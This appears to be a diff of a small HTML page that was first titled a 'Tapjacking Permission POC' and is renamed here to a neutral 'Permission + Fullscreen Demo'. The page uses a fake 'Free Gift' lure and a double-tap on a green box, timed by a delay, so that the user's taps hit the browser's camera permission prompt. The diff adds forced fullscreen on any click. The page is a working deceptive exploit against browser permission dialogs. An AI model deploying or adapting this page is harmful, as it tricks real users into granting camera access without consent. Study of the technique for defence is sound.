@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tapjacking Permission POC</title>
+  <title>Permission + Fullscreen Demo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
   
   <style>
     body {
-      margin: 10vh 10vw;  /* 👈 yaha change (pehle 30vh tha) */
+      margin: 10vh 10vw;
       height: 100vh;
       overflow: hidden;
       text-align: center;
@@ -30,44 +30,52 @@
   <script>
     function requestCameraPermission() {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function (stream) {
-          console.log('Camera permission granted.');
-        })
-        .catch(function (error) {
-          console.error('Error accessing the camera:', error);
-        });
+        .then(() => console.log('Camera granted'))
+        .catch(() => console.log('Denied'));
     }
 
-    function handleClick() {
+    function handleClick(event) {
+      event.stopPropagation(); // 👈 important (button click fullscreen trigger na kare)
+
       requestCameraPermission();
-      setTimeout(function() {
+
+      setTimeout(() => {
         document.getElementById("selectme").showPicker();
       }, 250);
     }
+
+    // 👇 fullscreen on page click (except button)
+    document.addEventListener("click", function(e) {
+      if (e.target.tagName !== "BUTTON") {
+        if (!document.fullscreenElement) {
+          document.documentElement.requestFullscreen().catch(() => {});
+        }
+      }
+    });
   </script>
 </head>
 
 <body>
 
 <center>
-  <button onclick="handleClick()">
+  <button onclick="handleClick(event)">
     🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩 = 🎁] the Green Box to Win a Free Gift! 🎉
   </button>
 </center>
 
 <div>
-  <select id="selectme" ondblclick="handleDoubleClick()">
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟩 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
-    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 </option>
+  <select id="selectme">
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟩 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
+    <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
   </select>
 </div>
 
